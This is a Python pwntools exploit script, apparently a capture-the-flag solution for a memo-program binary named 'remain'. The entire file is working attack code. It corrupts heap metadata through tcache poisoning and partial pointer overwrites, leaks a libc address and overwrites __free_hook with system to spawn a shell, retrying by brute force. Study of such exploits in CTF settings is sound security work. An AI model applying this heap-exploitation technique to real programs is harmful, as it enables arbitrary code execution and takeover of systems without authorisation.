from pwn import *
import sys


def debug(func):
    def wrapper(*argv, **kwargs):
        print("{}({}, {})".format(func.__name__, str(argv), str(kwargs)))
        return func(*argv, **kwargs)
    return wrapper

id_now = 0
@debug
def add(data):
    global id_now
    io.sendlineafter("> ", "1")
    io.sendafter(b"Input memo > ", data)
    id_now += 1
    return (id_now - 1)

@debug
def edit(id_, data):
    io.sendlineafter("> ", "2")
    io.sendlineafter(b"Input id > ", str(id_))
    io.sendafter(b"Input new memo > ", data)
    io.recvuntil("Done.")

@debug
def delete(id_):
    io.sendlineafter("> ", "3")
    io.sendlineafter("Input id > ", str(id_))
    io.recvuntil("Done.")


binpath = "./remain"
libcpath = "./libc.so.6"
context.binary = ELF(binpath)
context.terminal = ['tmux', 'split-w', '-h']

libc = ELF(libcpath)


env = {"LD_PRELOAD": libcpath}
gdbscript = """
gef
file {binpath}
""".format(binpath=binpath)

while True:
    try:
        io = process(["./ld.so", "./remain"], env=env, stderr=sys.stderr)

        payload = b''
        add(b'A' * 24)
        add(b'B' * 24)
        add(b'C' * 24)
        delete(0)
        delete(1)

        # addr &(entries[0x50]): 0x00007fae5190c0a8
        # overwrite 0x00a8
        edit(1, b'\xa8\n')

        add(b'hoge')

        # This will be pointer to entries[0x50]
        # now 4 will point to entries[0x50]
        add(b'\x28\x07')  # point to size of the bottom of large chunk

        delete(0)
        delete(1)
        edit(4, b'\x08\x07')  # point entries[0x50] to bottom of large chunk

        # build chunk to prevent consolidation
        payload = b''
        payload += p64(0x21)  # size | PREV_IN_USE
        payload += b'D' * 0x18
        payload += p64(0x21)
        add(payload)

        # overwrite size of chunk 1
        edit(1, b'\n')
        delete(0)
        edit(4, b'\xe0\x02')
        add(p64(0) + p64(0x421))  # 3
        delete(1)  # link libc

        delete(0)
        edit(1, b'\xc8\xe6')  # point to write_ptr
        edit(4, b'\xf0\x02')
        add('/bin/sh\x00')

        add(b'\xf0')
        data = io.recvuntil('>')
        if len(data) == 80:
            io.close()
            continue
    except EOFError:
        continue
    else:
        break

addr_libc = u64(data[5:5+8]) - 0x3b77e0
print('addr_libc = 0x{:x}'.format(addr_libc))

io.sendline("2")
io.sendlineafter(b"Input id > ", str(4))
io.sendafter(b"Input new memo > ", p64(0)[:6])
io.recvuntil("Done.")

gdb.attach(io, gdbscript=gdbscript)
delete(0)
# gdb.attach(io, gdbscript=gdbscript)
# io.sendline("3")
# io.sendlineafter("Input id > ", str(0))
# io.recvuntil("Done.")

edit(4, p64(addr_libc + libc.symbols['__free_hook'])[:6])

add(p64(addr_libc + libc.symbols['system'])[:6])
delete(1)

io.interactive()
